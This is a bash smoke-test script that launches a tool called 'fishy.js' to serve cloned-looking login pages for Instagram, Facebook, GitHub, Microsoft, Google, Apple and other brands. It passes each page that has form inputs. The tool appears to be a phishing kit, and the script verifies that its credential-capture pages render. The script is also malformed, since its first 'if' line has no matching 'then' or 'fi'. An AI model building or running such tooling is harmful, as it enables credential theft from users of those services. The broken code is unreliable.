#!/usr/bin/env bash
# Quick smoke test: start a server for each service and verify the login page is served
set -e
cd "$(dirname "$0")/.."

SERVICES="instagram facebook twitter linkedin github microsoft netflix google tiktok snapchat apple"
PASS=0
FAIL=0

echo "=== Smoke testing services ==="
for svc in $SERVICES; do
  printf "  %-15s ... " "$svc"
  if timeout 25 node bin/fishy.js serve "$svc" --no-open > /tmp/fishy-test-${svc}.log 2>&1 &
  PID=$!
  sleep 3
  URL=$(grep -oP 'http://localhost:\d+' /tmp/fishy-test-${svc}.log | head -1)
  if [ -z "$URL" ]; then
    echo "FAIL (no URL)" 
    kill $PID 2>/dev/null; FAIL=$((FAIL+1)); continue
  fi
  HTML=$(curl -s "$URL" 2>/dev/null || echo "")
  if echo "$HTML" | grep -qi '<input'; then
    echo "PASS (has inputs)"
    PASS=$((PASS+1))
  elif echo "$HTML" | grep -qi 'does not exist\|error\|not found\|not scraped'; then
    echo "FAIL (error page)"
    FAIL=$((FAIL+1))
  else
    SIZE=$(echo "$HTML" | wc -c)
    echo "WARN ($SIZE bytes, no inputs)"
  fi
  kill $PID 2>/dev/null
  wait $PID 2>/dev/null
done

echo ""
echo "=== Results: $PASS pass, $FAIL fail ==="
